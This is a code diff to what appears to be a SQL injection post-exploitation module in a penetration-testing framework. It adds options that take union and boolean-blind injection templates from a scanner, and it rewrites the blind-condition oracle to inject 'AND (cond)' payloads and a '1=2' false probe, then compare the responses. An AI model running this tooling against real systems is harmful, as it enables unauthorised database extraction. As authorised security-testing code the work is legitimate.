@@ -84,6 +84,30 @@ class Module(Post, Http_client, Sqli):
     blind_threads = OptPort(8, "Parallel threads for blind extraction", required=False, advanced=True)
     shell_sqli = OptBool(True, "Start Sqli pseudo-shell after confirmation", required=False)
     single_sql = OptString("@@version", "One-shot query when shell_sqli is false", required=False)
+    engine_union_template = OptString(
+        "",
+        "Union template from sqli_engine scan (overrides union_template when set)",
+        required=False,
+        advanced=True,
+    )
+    engine_blind_template = OptString(
+        "",
+        "Boolean-blind template from sqli_engine scan (overrides blind_true_template)",
+        required=False,
+        advanced=True,
+    )
+    engine_technique = OptString(
+        "",
+        "Extraction technique from scan: union or blind_boolean",
+        required=False,
+        advanced=True,
+    )
+    inj_original = OptString(
+        "",
+        "Original parameter value from sqli_engine context",
+        required=False,
+        advanced=True,
+    )
 
     def _opt(self, opt) -> str:
         return str(opt.value if hasattr(opt, "value") else opt or "")
@@ -98,11 +122,40 @@ class Module(Post, Http_client, Sqli):
         return f"{path_only}?{query}" if query else path_only
 
     def _original_value(self) -> str:
+        forced = self._opt(getattr(self, "inj_original", "")).strip()
+        if forced:
+            return forced
         parsed = urlparse(self._opt(self.inj_path) if self._opt(self.inj_path).startswith("/") else f"/{self.inj_path}")
         for key, value in parse_qsl(parsed.query, keep_blank_values=True):
             if key.lower() == self._opt(self.inj_param).lower():
                 return value if value else "1"
         return "1"
+
+    def _apply_engine_extraction_config(self) -> None:
+        union_tpl = self._opt(getattr(self, "engine_union_template", "")).strip()
+        blind_tpl = self._opt(getattr(self, "engine_blind_template", "")).strip()
+        technique = self._opt(getattr(self, "engine_technique", "")).strip().lower()
+        if union_tpl:
+            self.union_template = union_tpl
+        if blind_tpl:
+            self.blind_true_template = blind_tpl
+        if technique in {"union", "blind_boolean"}:
+            self.technique = technique
+
+    @classmethod
+    def extraction_options_from_hit(cls, hit: dict) -> dict:
+        """Build module option kwargs from an sqli_engine scanner hit."""
+        cfg = hit.get("extraction_config") if isinstance(hit, dict) else None
+        if not isinstance(cfg, dict):
+            cfg = {}
+        return {
+            "engine_union_template": str(cfg.get("union_template") or hit.get("union_template") or ""),
+            "engine_blind_template": str(cfg.get("blind_true_template") or hit.get("blind_true_template") or ""),
+            "engine_technique": str(cfg.get("technique") or hit.get("recommended_technique") or ""),
+            "inj_original": str(cfg.get("original") or hit.get("inj_original") or ""),
+            "inj_param": str(hit.get("param") or "id"),
+            "inj_method": str(hit.get("method") or "GET"),
+        }
 
     def _inject(self, payload: str, *, timeout: Optional[float] = None) -> Any:
         method = self._opt(self.inj_method).upper()
@@ -159,6 +212,9 @@ class Module(Post, Http_client, Sqli):
         return self._extract_from_body(body, self._opt(self.marker))
 
     def _blind_condition_true(self, cond: str) -> bool:
+        from lib.protocols.http.sqli_engine.comparison import boolean_evidence, similarity
+        from lib.protocols.http.sqli_engine.oracle import ProbeResponse
+
         original = self._original_value()
         tpl = self._opt(self.blind_true_template) or "{original} AND ({cond})"
         payload = tpl.replace("{original}", original).replace("{cond}", cond)
@@ -166,9 +222,24 @@ class Module(Post, Http_client, Sqli):
         probe = self._inject(payload)
         if not baseline or not probe:
             return False
-        bl = len(baseline.text or "")
-        pl = len(probe.text or "")
-        return abs(pl - bl) <= max(60, int(bl * 0.08))
+        base_p = ProbeResponse(
+            status_code=int(getattr(baseline, "status_code", 0) or 0),
+            text=str(getattr(baseline, "text", "") or ""),
+        )
+        probe_p = ProbeResponse(
+            status_code=int(getattr(probe, "status_code", 0) or 0),
+            text=str(getattr(probe, "text", "") or ""),
+        )
+        false_probe = self._inject(tpl.replace("{original}", original).replace("{cond}", "1=2"))
+        false_p = ProbeResponse(
+            status_code=int(getattr(false_probe, "status_code", 0) or 0),
+            text=str(getattr(false_probe, "text", "") or ""),
+        ) if false_probe else ProbeResponse()
+        if boolean_evidence(base_p, probe_p, false_p):
+            return True
+        bl = len(base_p.text or "")
+        pl = len(probe_p.text or "")
+        return similarity(base_p.text, probe_p.text) >= 0.90 and abs(pl - bl) <= max(60, int(bl * 0.08))
 
     def _blind_gt(self, expr: str) -> bool:
         return self._blind_condition_true(f"({expr})")
@@ -221,6 +292,8 @@ class Module(Post, Http_client, Sqli):
             print_error("Target unreachable.")
             self.vulnerability_info["reason"] = "Target unreachable"
             return False
+
+        self._apply_engine_extraction_config()
 
         print_status(
             f"HTTP SQLi post — {self._opt(self.inj_method).upper()} "
